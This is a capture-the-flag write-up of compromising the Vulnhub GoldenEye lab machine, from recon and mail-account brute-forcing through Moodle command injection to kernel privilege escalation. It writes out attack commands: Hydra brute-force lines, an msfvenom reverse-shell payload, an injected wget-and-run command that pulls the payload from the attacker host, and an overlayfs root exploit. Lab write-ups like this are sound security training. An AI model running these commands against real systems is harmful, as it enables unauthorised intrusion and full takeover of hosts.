## Vulnhub Writeup #1 Goldeneye

This is my first writeup, and also the first writeup I know of for the GoldenEye box.

This is described as an intermediate level box that's concomitant with some of the challenges in the OSCP training labs. I would tend to agree.

The first step is to run an NMap scan against the system
A few services are uncovered.
![tcpnmap](https://user-images.githubusercontent.com/15524701/43056876-6018ca72-8e04-11e8-9c9e-b6f5edcc0d1b.jpeg)

I always recon webservices first. Some text appears on the index.html page of the HTTP server listening on port 80. When the text finishes printing, it tells us to login at /sev-home/. 

Before doing that, I spidered spidering the page starting off at index.html and wound up finding a few items linked. I reviewed the source, but terminal.js (linked via a `src` tag in index.html) turned up gold. 


![comment-terminal](https://user-images.githubusercontent.com/15524701/43056867-5f586156-8e04-11e8-80de-ba1b0c06dbc6.jpeg)

The source of terminal.js exposes credentials for a user named Boris. These have a strange encoding that’s difficult to Google for since the search feature will filter ampersands and hash symbols, so I searched for “ampersand hash encoding”. The results indicated the associated password is encoded as semi-colon delimited HTML entities. We convert them into ASCII and get the credentials for user Boris with the following Python 2 one-liner which leverages the stdlib:

```
python -c 'import HTMLParser;h=HTMLParser.HTMLParser();s= h.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;");print s'
```

We use the credentials to login to /sev-home/ and look at the source of the landing page. There is a spiel in the comments about approved “operators”; in addition to mentioning Boris, it gives us another username, Natalya. This comment is easily missed if you're not paying attention and are fooled by the slick whitespace after line 24.

![comment-sev-home](https://user-images.githubusercontent.com/15524701/43056863-5ef4fc7e-8e04-11e8-989c-395d0797677c.jpeg)
_tons of white-space_
![comment-sev-home2](https://user-images.githubusercontent.com/15524701/43056866-5f4620c2-8e04-11e8-81d7-44807c41bcff.jpeg)

I failed to find additional interesting pages after additional spidering and brute-forcing of this authenticated area of the server and turned back towards the other services discovered by nmap.

Firstly I used the VRFY command on the SMTP server to verify usernames Boris and Natalya were known to the mail server, which they were. I then tried to bruteforce both of their accounts on the pop3 service listening on port 55007 using a wordlist i constructed with cewl, as well as some Kali wordlists.

Spidering and scraping with cewl
`cewl http://172.16.2.33/sev-home/ --auth_user=boris --auth_pass=InvincibleHack3r --auth_type=basic > /tmp/Goldeneye-WL.txt`

Attacking with Hydra
`hydra -e nsr 172.16.2.33 pop3 -l natalya -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V
hydra -e nsr 172.16.2.33 pop3 -l boris -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V`

The fasttrack.txt list (not the one generated with Cewl) was sufficient to crack both users mail accounts. 

We login as each user and retrieve their emails with STAT (to view the number of messages) and RETR x (retrieves the specified message where x is the message number). The emails turned up an additional subdirectory of the HTTP server to attack, /gnocertdir. 


In addition, we get the credentials for a user named xenia (who doesn’t appear to exist on the mailserver).


On trying to navigate to the same directory via the IP address of the host, a failure message would appear.
![redirect](https://user-images.githubusercontent.com/15524701/43056871-5fa6aeec-8e04-11e8-9eec-4a863aa96303.jpeg)

It turns out the subdirectories would only be accessible if we accessed them by navigating to hostname severnaya-station[.]com. This can be done by mapping the ip of the VM to severnaya-station.com in the /etc/hosts file on your attacker machine (this /etc/hosts hint was provided in one of the exposed emails).

This application hosted here is called Moodle and appears to be an education content management system. This application exposed a login form which accepted the newly found credentials for xenia. I clicked through each area of the application, checking for interesting information and using OWASP ZAP and it’s proxy to map things out. ZAP has a feature that allows using regex to search through HTTP responses, so I used the regex 

`(/\*([^*]|[\r\n]|(\*+([^*/]|[\r\n])))*\*+/|(?=<!--)([\s\S]*?)-->)`

to search for additional comments.

![regex](https://user-images.githubusercontent.com/15524701/43056872-5fb8a00c-8e04-11e8-8e65-7de9ec0c7046.jpeg)


In addition to comments, emails can be searched for with the following very hackish PCRE regex
`(\d@|\w@)` or a more proper PCRE regex `[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}` 

The above don’t turn up anything of use. 

After several passes through the app, and source code of the pages, I did eventually find something in the messaging system: a communication with  another user, "dr doak", which contained mention of another email address, **doak@**. 
![messaging](https://user-images.githubusercontent.com/15524701/43056870-5f9233ea-8e04-11e8-9f60-5b92d78bb969.jpeg)

This email was missed by the above regexes because it required interaction with the appropriate part of the page in order for the message contents to be returned in a response. However only the first (hackish/greedy) regex will match on the address since it's not formatted properly.

We head back to the SMTP service and run `VRFY doak` which presents us with a message that confirms the user is known to the mailserver. Then we run another bruteforce against the user with the same fasttrack.txt wordlist and quickly secure a valid creds.

Upon getting the users messages with **STAT** (to view the number of messages) and **RETR x** (where x is the message number), we obtain credentials for dr_doak's Moodle account. We once again enumerate Moodle, but this time in the context of the new user's account. There's a file which has been uploaded by the user.
![dr_doak_hint](https://user-images.githubusercontent.com/15524701/43061197-e9acb59a-8e19-11e8-93a5-5d22a67f5564.jpeg)


The file contents disclose another hidden resource on the server which apparently contain administrator credentials. 
![dr_doak_hint2](https://user-images.githubusercontent.com/15524701/43061198-e9c125b6-8e19-11e8-9771-52f6257ef385.jpeg)


I downloaded the image hosted at that location and ran `strings` over it and some of the exif data appeared to contain a base64 encoded string. 
I decoded this with `python -c 'import base64;s=base64.b64decode("eFdpbnRlcjE5OTV4IQ==");print s'`



This next part was a bit difficult. 

With admin creds i searched about the application for additional information disclosure without much success. The application had a very large collection of features and links; per the methodology professed in the Web App Hacker's Handbook I clicked through every single link exposed via the admin credentials and explored each page. 

I came upon a section that appeared to allow the input of shell commands into fields meant to specify the paths of different plugins. 

![systempaths](https://user-images.githubusercontent.com/15524701/43056875-60002f44-8e04-11e8-845b-96883d2bba3a.jpeg)

The application mentioned a path to **aspell**, a spell cheak application, but the editor in use on this web app didn’t appear to include aspell (it did include pspell and a google service, though). I decided to look around a bit more.


Looking up several exploits for Moodle on exploit-db didn’t appear to be fruitful. It was also difficult to determine what version of Moodle was running on the server and hence understand which exploits might work. Looking into my site-map built out by my browsing and spidering in **OWASP ZAP** a bit more, I noticed something I'd missed before: a plugin directory which mentioned tinyMCE and YUI, as well as the corresponding version numbers of these applications.

I searched google for Moodle changelogs and was able to determine the versions of tinyMCE and YUI appeared to have shipped with version 2.2.3. This also was corroborated by a few pages in /gnocertdir having 2.2.3 in the headers with no other context. 

Armed with this information i went back through the exploit-db exploits, and also decided to search about in Metasploit (after launching Metasploit with `msfconsole` enter `search moodle` and wait for results to appear). The following exploit is the only result for moodle, and appears to target version 2.2.3:https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec 

I attempted to fire off this MSF exploit, and the exploit ran but failed to generate a shell. I looked further into the source code of the module and noticed it was apparently trying to target the same area of the application I was looking at earlier which referenced the system path of the **aspell** plugin.

I had been confused earlier as the exploits noted appeared to target **aspell**, while the tinyMCE editor only had PSpell listed as an available plugin on its Moodle configuration page. However a quick Google search showed that PSpell was dependent on aspell installations, so I surmised this dependency could trigger the vulnerability. First I created my payload: 

`sudo msfvenom -p php/reverse_perl lhost=172.16.2.2 lport=443 -f raw -o /var/www/html/phprev443perl.php`

I then manually edited the sh command that was originally meant to trigger the spell checker to read:

`sh -c '(wget 172.16.2.2/phprev443perl.php -O/tmp/phprev443perl.php && php /tmp/phprev443perl.php)'`

After setting up my listener, I then navigated to a page that had a text editor running, and looked for the spellcheck option.
![spellcheck](https://user-images.githubusercontent.com/15524701/43056874-5fec938a-8e04-11e8-900c-2038c113d74d.jpeg)

(The rightmost button in the bottom row activates the spellcehck feature).

Clicking the button triggered my command and the reverse shell was sent to the C2 system in the context of the remote user www-data, the low-priv apache account meant to prevent successful RCE attacks against Apache servers from giving root privileges.


#Post Exploitation
First, I upgraded my shell to a pseudo tty. This helps increase the sorts of commands we can run without failure, which can include things such as the `su` and `cd`. Since ``python`` is installed, we can use the trusty pty module:
python -c 'import pty;pty.spawn("/bin/bash")'

If it weren’t, we could get **socat** from our C2 machine and use that alternatively. A nifty guide on shell upgrades can be found here: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

With an upgraded shell, I began to scan the directories of the webserver, /var/www/html/ for additional information. 

I also poked in the server root in /etc/apache2. navigating there, I found a .htpasswd file which contained creds for 2 users, _boris_ and _ops_. htpasswd contains login credentials used to access pages protected by basic auth on the Apache server (in this case the /sev-home/ directory). I already had Boris’ creds from earlier, so I tried to crack ops’ creds. Utilizing hashcat, i employed several million words (the entirety of the seclists/passwords wordlist suite hosted on github) and failed to crack ops’ password. I then did a straight bruteforce up to 6 characters including special chars and failed to get a match. 7 chars would have taken 4 days, so I determined that wasn’t going to be the way in. 

Going back to the /var/www/html/ directory, i started to grep for more mentions of the usernames, boris, natalya, and so on. I found a mention in a page I hadn’t explored yet `severnaya-station.com/splashAdmin.php`

Navigating here, we get a sort of message board containing chatter between a few users, with an admin mentioning that GCC had been removed from the box and replaced by a FreeBSD alternative. I did some quick searching and found this alternative app to be `clang`, which has LLVM as a backend. This is a gcc compatible compiling engine created as an alternative to gcc at least in part due to some differences of political and technical opinion between the relevant camps.

The chatter about compilers was a dead giveaway that the host might be vulnerable to a kernel exploit. Running uname -a indicated the host was running linux kernel 3.13.0-32. Searchsploit indicated this was vulnerable to a well known overlayfs privilege escalation flaw. 

The source of the exploit with searchsploit -x 37292, there was a single reference to `gcc` which i replaced with `clang`. I wasn’t sure if the machine had the FS_USERNS_MOUNT flag enabled, a pre-requisite for this exploit to run. Checking in /boot/config-3.13.0-32-generic for the flag with `cat /boot/config-3.13.0-32-generic | grep -i fs_userns`, I found no references to it. This was not promising.

However I wasn’t sure this was conclusive, and the exploit itself contained verbose error output in the event the FS_USERNS_MOUNT flag wasn’t enabled, so I went for it anyway since that would be a more conclusive test. 

I used curl to download the source for the exploit to /tmp/ on the goldeneye host, and compiled it with `clang ofs.c -o ofs`

Several ugly looking warnings were generated, but unlike errors, warnings aren’t fatal.
I ran the compiled binary and the repl shifted to a newline and displayed a symbol
**#**

Running whoami confirmed I had root privileges. I navigated to the /root/ dir, viewed the flag, and treated myself to the reward left by the author, which anyone who’s seen Goldeneye will appreciate.
![flag](https://user-images.githubusercontent.com/15524701/43056868-5f6dea80-8e04-11e8-903e-faef98967592.jpeg)
![flag_anim](https://user-images.githubusercontent.com/15524701/43056869-5f81dfb8-8e04-11e8-8736-58a2fdac56a0.jpeg)
#
